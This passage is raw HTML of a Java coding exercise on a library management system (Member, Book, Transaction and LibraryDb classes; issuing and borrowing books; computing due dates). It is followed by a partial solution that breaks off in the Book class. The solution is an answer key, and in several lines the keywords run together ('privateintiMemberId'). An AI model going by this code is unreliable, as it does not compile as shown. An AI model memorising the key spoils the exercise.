font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">Then, find the Book availability using the\r\nsame <b>index</b> in the <b>BookStatus[]</b> array.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Symbol; color: black;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">If it is 0 then return 0, else return 1;</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">If the <b>Bookid</b>\r\nis not find in the <b>Books[]</b> array,\r\nthen return 0.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Issuebook(int,int):void method:</span></b></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\"><o:p></o:p></span></b></p><p class=\"MsoNormal\" style=\"text-align: left; \">\r\n\r\n</p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This method accepts <b>Memberid</b>\r\nof a member and <b>Bookid</b> of a Book.</span><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"color: rgb(0, 0, 0); font-family: Wingdings; font-size: 16px; text-indent: -24px;\">Ø</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">&nbsp; This method finds the </span><b style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">index</b><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\"> of the member through linear search and updates the value of\r\nsame </span><b style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">index</b><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">&nbsp; &nbsp; &nbsp; &nbsp; in </span><b style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">Bookstaken[]</b><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\"> array by increasing 1.</span></p><p class=\"MsoListParagraph\" style=\"text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">This method finds the <b>index</b> of the book through linear search and update the value of\r\nsame index in</span></p><p class=\"MsoListParagraph\" style=\"text-align: left; text-indent: -0.25in;\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\"><b>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;BookStatus[]</b> array by\r\n0.&nbsp;</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Transaction Class</span></u></b></p><p class=\"MsoNormal\" style=\"text-align: left;\"><b><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Transaction (Member,Book) method:</span></b><b><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">&nbsp;</span></b></p><p class=\"MsoNormal\" style=\"text-align: left;\"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This method is a constructor method that initializes the\r\nmember and book objects.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">BorrowBook() method:</span></u></b></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This method is used to borrow a book from Library.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This method invoke <b>validateMemberEligibility()</b>\r\nmethod of <b>LibraryDb</b>, if valid</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Courier New&quot;; color: black;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">Invoke <b>validateBookAvailability()</b>\r\nmethod of <b>LibraryDb</b>, if valid</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Symbol; color: black;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This method gets current date as <b>Borrow </b>date from system.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Symbol; color: black;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This method calculates <b>return</b> date by adding 14 days from <b>Borrow</b> date.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Symbol; color: black;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This method displays <b>Borrow</b> date and <b>Return</b>\r\ndate as follows</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><i style=\"text-indent: 0.5in;\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">&nbsp;Borrow date:dd/MM/yyyy</span></i></p><p class=\"MsoNormal\" style=\"text-align: left; \"><i style=\"text-indent: 0.5in;\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Return date:dd/MM/yyyy</span></i></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Symbol; color: black;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This method invoke <b>issue book() </b>method of <b>LibraryDb</b>\r\nto update the Number of <b>bookstaken[]</b>\r\nand <b>BookStatus[]</b>.</span></p><p class=\"MsoNormal\" style=\"text-align:justify;line-height:150%;tab-stops:.25in\"><b><u><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Demo\r\nClass:<o:p></o:p></span></u></b></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; margin-left: 1in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">This Class is a Starter Class.<o:p></o:p></span></p><p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; margin-left: 1in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">&nbsp;Code is already\r\nprovided for you.<o:p></o:p></span></p><p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; margin-left: 1in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">You can modify the class for testing purpose.<o:p></o:p></span></p><p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; margin-left: 1in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">This class will not be evaluated.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \">\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">This Code includes solution for the above\r\nquestion. The code below comment line // write your code here is the solution.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\"><o:p></o:p></span></p><p class=\"MsoListParagraph\" style=\"text-align: left; text-indent: -0.25in;\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\"><o:p></o:p></span></p><p class=\"MsoListParagraph\" style=\"margin-left:1.0in;mso-add-space:auto;\r\ntext-indent:-.25in;mso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\"><o:p></o:p></span></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; text-indent: -0.25in;\"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">&nbsp; &nbsp; &nbsp; </span><b style=\"text-align: justify;\"><u><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Solution\r\nCode:</span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">importjava.text.DateFormat;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">importjava.text.SimpleDateFormat;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">importjava.util.*;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><u><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;mso-themecolor:\r\ntext1\">//Member Class<o:p></o:p></span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">class Member </span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;privateintiMemberId;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;private\r\nString sMemberName;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;private\r\nString sMemberType;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;staticint\r\ncounter=2000;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;Member(String\r\nsMemberName, String sMemberType )<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;this.iMemberId\r\n= ++counter;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;this.sMemberName\r\n= sMemberName;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;this.sMemberType\r\n= sMemberType;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;publicintgetMemberId()<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;returniMemberId;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;public\r\nString getMemberName()<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;returnsMemberName;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;public\r\nString getMemberType()<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;returnsMemberType;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; }</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; }</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><u><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;mso-themecolor:\r\ntext1\">//Book Class</span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">class Book {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">privateintiBookId;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private String sTitle;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private String sPublisher;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">staticint counter = 1000;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">Book(String sTitle, String sPublisher)<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">this.iBookId\r\n= ++counter;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">this.sTitle\r\n= sTitle;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">this.sPublisher\r\n= sPublisher;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; &nbsp;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">publicintgetiBookId() {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">returniBookId;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">public String getsTitle() {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">returnsTitle;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">public String getsPublisher() {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;returnsPublisher;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New 